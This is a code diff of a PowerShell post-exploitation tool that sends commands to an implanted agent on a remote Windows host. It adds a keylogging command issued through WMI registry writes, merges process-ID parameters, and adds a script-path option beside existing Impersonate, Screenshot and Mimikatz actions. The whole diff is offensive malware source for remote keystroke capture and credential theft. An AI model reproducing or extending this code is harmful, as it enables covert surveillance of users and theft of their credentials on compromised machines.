@@ -269,22 +269,18 @@ function Invoke-RemoteReconCmd {
         [parameter(Mandatory=$true, ParameterSetName='Impersonate')]
         [switch]$Impersonate,
 
-        [parameter(Mandatory=$true, ParameterSetName='Impersonate')]
-        [ValidateNotNullOrEmpty()]
-        [int]$ImpersonatePID,
-
         [parameter(Mandatory=$true, ParameterSetName='Screenshot')]
         [switch]$Screenshot,
-
-        [parameter(Mandatory=$false, ParameterSetName='Screenshot')]
-        [ValidateNotNullOrEmpty()]
-        [int]$ScreenshotPID,
 
         [parameter(Mandatory=$true, ParameterSetName='Keylog')]
         [switch]$Keylog,
 
-        [parameter(Mandatory=$false, ParameterSetName='Keylog')]
-        [int]$KeylogPID,
+        [parameter(Mandatory=$true, ParameterSetName='Keylog')]
+        [switch]$KeylogStop,
+
+        [parameter(Mandatory=$false)]
+        [ValidateNotNullOrEmpty()]
+        [int]$ProcessId,
 
         [parameter(Mandatory=$true, ParameterSetName='Mimikatz')]
         [switch]$Mimikatz,
@@ -296,9 +292,14 @@ function Invoke-RemoteReconCmd {
         [parameter(Mandatory=$true, ParameterSetName='PowerShell')]
         [switch]$PowerShell,
 
-        [parameter(Mandatory=$true, ParameterSetName='PowerShell')]
+        [parameter(Mandatory=$false, ParameterSetName='PowerShell')]
         [ValidateNotNullOrEmpty()]
         [string]$PowerShellCommand,
+
+        [parameter(Mandatory=$false, ParameterSetName='PowerShell')]
+        [ValidateNotNullOrEmpty()]
+        [ValidateScript({Test-Path $_})]
+        [string]$ScriptPath,
 
         [parameter(Mandatory=$true, ParameterSetName='Sleep')]
         [switch]$Sleep,
@@ -397,6 +398,25 @@ function Invoke-RemoteReconCmd {
 
         }
         'Keylog' {
+            # Send the command argument first so it isn't missed when the agent picks up the command
+            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"$ProcessId",$CommandArgsKey
+            $returnObject.CommandArguments = $ProcessId
+            Write-Verbose "[+] Sending Keylog command arguments"
+            $result = Invoke-WmiMethod @wmiArgs @commonArgs
+            if ($result.ReturnValue -ne 0) {
+                Write-Warning "[-] Unable to issue Keylog command."
+            }
+
+
+            #send the command 
+            $wmiArgs['Name'] = "SetDWORDValue"
+            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$CommandKey,2
+            $returnObject.Command = "Keylog"
+            Write-Verbose "[+] Sending Keylog command"
+            $result = Invoke-WmiMethod @wmiArgs @commonArgs
+            if ($result.ReturnValue -ne 0) {
+                Write-Warning "[-] Unable to issue Keylog command."
+            }
              #$wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"keylog",$CommandKey
         }
     }
@@ -540,6 +560,9 @@ function Get-ReconResult {
                 }
                 
             }
+        }
+        "Keylog" {
+            
         }
         Default {}
     }
